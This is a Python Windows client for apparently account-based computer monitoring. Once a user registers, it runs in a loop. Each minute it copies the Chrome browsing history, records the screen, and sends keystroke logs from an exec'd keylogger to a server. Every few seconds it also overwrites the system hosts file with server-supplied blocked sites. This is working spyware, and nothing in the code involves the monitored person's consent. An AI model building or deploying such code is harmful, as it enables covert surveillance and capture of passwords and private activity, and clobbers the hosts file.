import datetime
import requests
from shutil import copyfile
import os
import pathlib
from time import time, sleep
import cv2
import numpy as np
import pyautogui
import subprocess
import _thread
import schedule

username = ""
url = 'http://127.0.0.1:8000/'
send_url = url + 'send/'
post_requests_not_sent = []
get_requests_not_sent = []

def history_send():
    file_src = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\history"
    dst = str(pathlib.Path(__file__).parent.absolute()) + "\\history" + str(int(time())) + "_" + username
    copyfile(file_src, dst)
    url = send_url + 'historyfile/'
    files = {'history': open(dst,'rb')}
    values = {'user': username}
    send_post(url, files, values)


def send_post(url, files, values):
    global post_requests_not_sent
    post_requests_not_sent.append((url, files, values))
    connection = True
    while connection and post_requests_not_sent:
        try:
            requests.get(url + "check/", params={'user': ''})
            url = post_requests_not_sent[0][0]
            files = post_requests_not_sent[0][1]
            values = post_requests_not_sent[0][2]
            r = requests.post(url, files=files, data=values)
            print(r)
            del post_requests_not_sent[0]
        except:
            connection = False
            print("no connection - request not sent")


def send_get(url, params):
    global get_requests_not_sent
    get_requests_not_sent.append((url, params))
    connection = True
    while connection and get_requests_not_sent:
        try:
            requests.get(url + "check/", params={'user': ''})
            url = get_requests_not_sent[0][0]
            params = get_requests_not_sent[0][1]
            r = requests.get(url, params=params)
            print(r)
            del get_requests_not_sent[0]
        except:
            connection = False
            print("no connection - request not sent")


def screen_record():
    global username
    # display screen resolution, get it from your OS settings
    SCREEN_SIZE = (1920, 1080)
    FPS = 20.0
    # define the codec
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    # create the video write object]
    time_now = str(int(time()))
    out = cv2.VideoWriter("output" + time_now + "_" + username + ".avi", fourcc, FPS, SCREEN_SIZE)
    end = time() + 60
    while time() < end:
        # make a screenshot
        img = pyautogui.screenshot()
        # convert these pixels to a proper numpy array to work with OpenCV
        frame = np.array(img)
        # convert colors from BGR to RGB
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        # write the frame
        out.write(frame)

    # make sure everything is closed when exited
    cv2.destroyAllWindows()
    out.release()

    infile = str(os.path.dirname(os.path.realpath(__file__))) + '\\output' + time_now + '_' + username + '.avi'
    outfile = 'output' + time_now + '_' + username + '.mp4'

    subprocess.run(['C:\\ffmpeg\\bin\\ffmpeg', '-i', infile, outfile])

    url = send_url + 'screenrecords/'
    files = {'record': open(outfile, 'rb')}
    values = {'user': username}

    send_post(url, files, values)

    os.remove('output' + time_now + '_' + username + '.avi')


def screen_record_thread():
    print("hello")
    _thread.start_new_thread(screen_record, ())


def keylogger_send():
    f = open("READ_ME.txt", "r")
    x = f.read()
    print("data from file: " + x)
    send_get(send_url + "keylogs/", {'content': x, 'user': username})
    f.close()
    f = open("READ_ME.txt", "w")
    f.write('')
    f.close()


def start_keylogger():
    exec(open("keylogger.py").read())


def block_url():
    r = requests.get(send_url + "blockedurls/", params={'user': username})
    print(r)
    urls_string = r.text
    urls = urls_string.split("  ")
    print(urls)
    if urls[0] == "ok":
        urls = urls[1:]
        print(urls)
        # Windows host file path
        hostsPath = r"C:\Windows\System32\drivers\etc\hosts"
        redirect = "127.0.0.1"
        content = ""
        with open(hostsPath, 'w') as file:
            for site in urls:
                content = content + redirect + " " + site + "\n"
            file.write(content)
            file.close()

def program_run():
    schedule.every(5).seconds.do(block_url)
    schedule.every().minute.at(':00').do(screen_record_thread)
    schedule.every().minute.at(':00').do(keylogger_send)
    schedule.every().minute.at(':00').do(history_send)
    while True:
        schedule.run_pending()
        sleep(1)


def main():
    global username
    first = True
    while True:
        if first:
            f = open("username.txt", "a")
            f.write('')
            f.close()
            f = open("username.txt", "r")
            username_try = f.read()
            f.close()
            first = False
            if username_try == '':
                continue
        else:
            print("Enter your username: ")
            username_try = input()
        r = requests.get(url + "check/", params={'user': username_try})
        if r.text == "ok":
            print("this computer's data will be in '" + username_try + "' account.")
            username = username_try
            f = open("username.txt", "w")
            f.write(username)
            f.close()
            program_run()
            break
        else:
            print("there's not such user '" + username_try + "', please try again. If you have no account register in our site.")


if __name__ == '__main__':
    main()
